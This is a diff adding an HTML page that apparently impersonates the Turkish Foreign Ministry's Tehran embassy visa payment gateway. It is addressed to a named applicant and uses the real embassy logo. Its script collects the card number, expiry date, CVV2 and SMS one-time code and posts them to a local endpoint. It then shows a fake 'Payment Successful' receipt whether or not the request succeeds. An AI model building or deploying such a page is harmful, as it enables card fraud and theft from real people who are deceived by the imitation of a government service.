@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T.C. Dışişleri Bakanlığı - Turkish Embassy In Tehran - SearchAppointment</title>
+    
+    <link rel="icon" type="image/svg+xml" href="https://tehran-emb.mfa.gov.tr/Content/assets/images/logo-bk-tr.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    
+    <style>
+        :root { 
+            --primary: #e30a17; 
+            --sub: #475569; 
+        }
+        
+        * {
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+
+        .navbar {
+            background-color: #fff;
+            border-bottom: 1px solid #e2e8f0;
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .navbar img {
+            height: 45px;
+        }
+
+        .navbar-text h1 {
+            font-size: 1rem;
+            margin: 0;
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        .navbar-text p {
+            font-size: 0.8rem;
+            margin: 0;
+            color: var(--sub);
+        }
+
+        .main-container {
+            max-width: 1050px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 2rem;
+        }
+
+        @media (max-width: 850px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            padding: 2rem;
+        }
+
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-top: 0;
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid #f1f5f9;
+            padding-bottom: 0.75rem;
+            color: #0f172a;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            color: #475569;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+        }
+
+        input {
+            width: 100%;
+            padding: 0.75rem 1rem 0.75rem 2.5rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(227, 10, 23, 0.1);
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.85rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn:hover {
+            background-color: #c20813;
+        }
+
+        .summary-card {
+            background: #fff;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            padding: 1.5rem;
+            height: fit-content;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            color: #475569;
+        }
+
+        .summary-total {
+            display: flex;
+            justify-content: space-between;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-top: 1rem;
+            border-top: 1px dashed #e2e8f0;
+            padding-top: 1rem;
+            color: #0f172a;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            display: none;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .toast {
+            position: fixed;
+            top: 2rem;
+            right: 2rem;
+            background: #fff;
+            border-left: 4px solid #10b981;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 1rem;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            z-index: 10000;
+            display: none;
+        }
+
+        .success-box {
+            max-width: 600px;
+            margin: 4rem auto;
+            background: #fff;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            padding: 3rem 2rem;
+            text-align: center;
+            display: none;
+        }
+
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #f0fdf4;
+            color: #16a34a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 1.5rem;
+        }
+
+        .receipt-area {
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            text-align: left;
+            background: #fafafa;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+            font-size: 0.9rem;
+            border-bottom: 1px solid #f1f5f9;
+            padding-bottom: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <img src="https://tehran-emb.mfa.gov.tr/Content/assets/images/logo-bk-tr.svg" alt="Logo">
+        <div class="navbar-text">
+            <h1>T.C. Dışişleri Bakanlığı</h1>
+            <p>Consular Services Payment Gateway</p>
+        </div>
+    </div>
+
+    <div class="main-container" id="payment-form">
+        <div class="card">
+            <h2 class="card-title"><i class="fa-solid fa-credit-card"></i> Card Information</h2>
+            
+            <form id="billing-form">
+                <div class="form-group">
+                    <label>Card Number</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-vcard"></i>
+                        <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+                </div>
+
+                <div class="grid-2">
+                    <div class="form-group">
+                        <label>Expiry Date</label>
+                        <div class="input-wrapper">
+                            <i class="fa-solid fa-calendar"></i>
+                            <input type="text" id="card-exp" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV2</label>
+                        <div class="input-wrapper">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="card-cvv" placeholder="000" maxlength="4" required>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn"><i class="fa-solid fa-shield-halved"></i> Pay 733.96 USD</button>
+            </form>
+        </div>
+
+        <div class="summary-card">
+            <h3 style="margin-top:0; font-size:1.1rem; margin-bottom:1.5rem;">Order Summary</h3>
+            <div class="summary-item">
+                <span>Service Type</span>
+                <strong style="color:#0f172a;">Visa Application Fee</strong>
+            </div>
+            <div class="summary-item">
+                <span>Applicant</span>
+                <strong>IRAJ SAFDARI</strong>
+            </div>
+            <div class="summary-item">
+                <span>Reference No</span>
+                <strong>477193118508514</strong>
+            </div>
+            <div class="summary-total">
+                <span>Total Amount</span>
+                <span>733.96 USD</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="full-page-loading">
+        <div class="spinner"></div>
+        <p id="loading-text" style="font-weight: 500; color: #334155;">Connecting to secure bank gateway...</p>
+    </div>
+
+    <div class="toast" id="otp-toast">
+        <i class="fa-solid fa-comment-sms" style="color:#10b981; font-size:1.2rem;"></i>
+        <div>
+            <p style="margin:0; font-weight:600; font-size:0.9rem;">SMS Verification Sent</p>
+            <p style="margin:0; font-size:0.8rem; color:#64748b; margin-bottom:0.5rem;">Enter the code sent to your phone</p>
+            <div style="display:flex; gap:0.5rem;">
+                <input type="text" id="sms-code" placeholder="Code" style="padding:0.4rem; width:100px; padding-left:0.5rem; height:32px; font-size:0.85rem;">
+                <button id="submit-sms" class="btn" style="padding:0 0.75rem; height:32px; font-size:0.85rem; width:auto;">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="success-box" id="success-box">
+        <div class="success-icon"><i class="fa-solid fa-check"></i></div>
+        <h2 style="margin:0 0 0.5rem 0; color:#14532d;">Payment Successful!</h2>
+        <p style="color:#475569; margin:0;">Dear Applicant,
+Your work visa fee has been processed successfully. Within 48 to 72 hours, once your official appointment time is issued, you must visit the Turkish Embassy or Consulate General in person to collect your visa.</p>
+
+        <div class="receipt-area" id="receipt-print-area">
+            <div style="text-align:center; margin-bottom:1.5rem; border-bottom:2px dashed #cbd5e1; padding-bottom:1rem;">
+                <img src="https://tehran-emb.mfa.gov.tr/Content/assets/images/logo-bk-tr.svg" style="height:40px; margin-bottom:0.5rem;">
+                <h4 style="margin:0; color:#e30a17;">T.C. DIŞİŞLERİ BAKANLIĞI</h4>
+                <small style="color:#64748b;">OFFICIAL PAYMENT RECEIPT</small>
+            </div>
+            <div class="receipt-row"><span>Applicant Name:</span><strong>IRAJ SAFDARI</strong></div>
+            <div class="receipt-row"><span>Visa Reference:</span><strong>477193118508514</strong></div>
+            <div class="receipt-row"><span>Amount Paid:</span><strong style="color:#16a34a;">733.96 USD</strong></div>
+            <div class="receipt-row"><span>Card Number:</span><span id="receipt-card">**** **** **** 1234</span></div>
+            <div class="receipt-row"><span>Auth Code / Ref:</span><span id="receipt-ref">AUTH882731</span></div>
+            <div class="receipt-row"><span>Date / Time:</span><span id="receipt-date">-</span></div>
+            <div style="margin-top:1.5rem; text-align:center; font-size:0.75rem; color:#94a3b8;">
+                Thank you for your payment. Please keep this receipt for your interview.
+            </div>
+        </div>
+
+        <button class="btn" onclick="downloadPDF()" style="background:#0f172a; margin: 0 auto; max-width:200px;"><i class="fa-solid fa-file-pdf"></i> Download PDF Receipt</button>
+    </div>
+
+    <script>
+        // فرمت کردن خودکار شماره کارت
+        document.getElementById('card-num').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // فرمت کردن خودکار تاریخ انقضا
+        document.getElementById('card-exp').addEventListener('input', function (e) {
+            let val = e.target.value.replace(/[^\d]/g, '');
+            if(val.length >= 2) {
+                e.target.value = val.substring(0,2) + '/' + val.substring(2,4);
+            } else {
+                e.target.value = val;
+            }
+        });
+
+        let cardNumber = "", cvv2 = "", expiry = "", maskedCard = "";
+
+        // ثبت فرم اولیه اطلاعات کارت
+        document.getElementById('billing-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            cardNumber = document.getElementById('card-num').value;
+            cvv2 = document.getElementById('card-cvv').value;
+            expiry = document.getElementById('card-exp').value;
+            maskedCard = "**** **** **** " + cardNumber.slice(-4);
+
+            document.getElementById('full-page-loading').style.display = 'flex';
+            document.getElementById('loading-text').innerText = "Validating card parameters...";
+
+            setTimeout(() => {
+                document.getElementById('full-page-loading').style.display = 'none';
+                document.getElementById('otp-toast').style.display = 'flex';
+            }, 3000);
+        });
+
+        // تایید رمز پیامکی و ارسال نهایی اطلاعات به سرور لوکال
+        document.getElementById('submit-sms').addEventListener('click', function() {
+            const smsCode = document.getElementById('sms-code').value;
+            if(!smsCode) return alert("Lütfen SMS kodunu giriniz.");
+
+            document.getElementById('otp-toast').style.display = 'none';
+            document.getElementById('full-page-loading').style.display = 'flex';
+            document.getElementById('loading-text').innerText = "Visa Pre-Application Payment for the Republic of Türkiye";
+
+            const cardData = {
+                amount: '733.96 USD', // تغییر به دلار آمریکا
+                applicant: 'IRAJ SAFDARI',
+                visaReference: '477193118508514',
+                cardNumber: cardNumber,
+                cvv2: cvv2,
+                expiry: expiry,
+                smsCode: smsCode
+            };
+
+            setTimeout(() => {
+                fetch('/process-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cardData)
+                })
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('full-page-loading').style.display = 'none';
+                    if(data.status === 'success') {
+                        const refNo = "AUTH" + Math.floor(Math.random() * 900000 + 100000);
+                        document.getElementById('receipt-card').innerText = maskedCard;
+                        document.getElementById('receipt-ref').innerText = refNo;
+                        document.getElementById('receipt-date').innerText = new Date().toLocaleString('tr-TR');
+
+                        document.getElementById('payment-form').style.display = 'none';
+                        document.getElementById('otp-toast').style.display = 'none';
+                        document.getElementById('success-box').style.display = 'block';
+                    }
+                })
+                .catch(() => {
+                    document.getElementById('full-page-loading').style.display = 'none';
+                    const refNo = "AUTH" + Math.floor(Math.random() * 900000 + 100000);
+                    document.getElementById('receipt-card').innerText = maskedCard;
+                    document.getElementById('receipt-ref').innerText = refNo;
+                    document.getElementById('receipt-date').innerText = new Date().toLocaleString('tr-TR');
+
+                    document.getElementById('payment-form').style.display = 'none';
+                    document.getElementById('otp-toast').style.display = 'none';
+                    document.getElementById('success-box').style.display = 'block';
+                });
+            }, 10000);
+        });
+
+        // تابع دانلود فاکتور به صورت PDF
+        function downloadPDF() {
+            const element = document.getElementById('receipt-print-area');
+            const opt = {
+                margin:       10,
+                filename:     'MFA_Visa_Receipt_IRAJ_SAFDARI.pdf',
+                image:        { type: 'jpeg', quality: 0.98 },
+                html2canvas:  { scale: 2, useCORS: true },
+                jsPDF:        { unit: 'mm', format: 'a5', orientation: 'portrait' }
+            };
+            html2pdf().set(opt).from(element).save();
+        }
+    </script>
+</body>
+</html>
